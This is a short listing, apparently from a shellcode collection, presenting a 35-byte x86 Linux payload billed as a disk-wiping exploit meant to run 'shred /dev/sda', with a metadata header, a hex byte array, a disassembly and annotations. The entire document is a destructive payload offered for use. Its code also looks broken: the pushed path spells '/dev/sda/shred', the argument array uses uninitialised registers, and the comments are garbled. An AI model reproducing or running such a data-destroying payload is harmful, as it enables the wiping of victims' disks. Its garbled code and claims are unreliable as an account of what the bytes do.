# ALNX-1003-SDASHR
Linux PartitionShredding Exploit

```yaml
TargetOS: Linux
TestedOn: Kali linux 2020.2a i386 x86
Payload: ASM>SH<=>N/A
Language: C++ / Shellcode-Hex / Assembly
Patch: n/a
Danger: Godzilla
Classification: ALNX-1003-SDASHR
SByte-Boom: 35
```

**_Payload_**
```asm
{ 0x31, 0xC0, 0x50, 0x66, 0x68, 0x65,0x64, 
0x68, 0x2F, 0x73, 0x68, 0x72, 0x68, 0x2F, 
0x73, 0x64, 0x61, 0x68, 0x2F, 0x64, 0x65,
0x76, 0x89, 0xE3, 0x50, 0x55, 0x57, 0x56, 
0x53, 0x89, 0xE1, 0xB0, 0x0B, 0xCD, 0x80 }
```

**_Disassembly_**
```asm
0:  31 c0                xor    eax,eax
2:  50                   push   eax
3:  66 68 65 64          pushw  0x6465
7:  68 2f 73 68 72       push   0x7268732f
c:  68 2f 73 64 61       push   0x6164732f
11: 68 2f 64 65 76       push   0x7665642f
16: 89 e3                mov    ebx,esp
18: 50                   push   eax
19: 55                   push   ebp
1a: 57                   push   edi
1b: 56                   push   esi
1c: 53                   push   ebx
1d: 89 e1                mov    ecx,esp
1f: b0 0b                mov    al,0xb
21: cd 80                int    0x80
```

**_PayloadDisassemble_**
```asm
0x6465 de        ; pushw -v
0x7268732f rhs/ 
0x6164732f ads/  ; de+>?<= <shr<sda<dev
0x7665642f ved/  ; shred /dev/sda
```


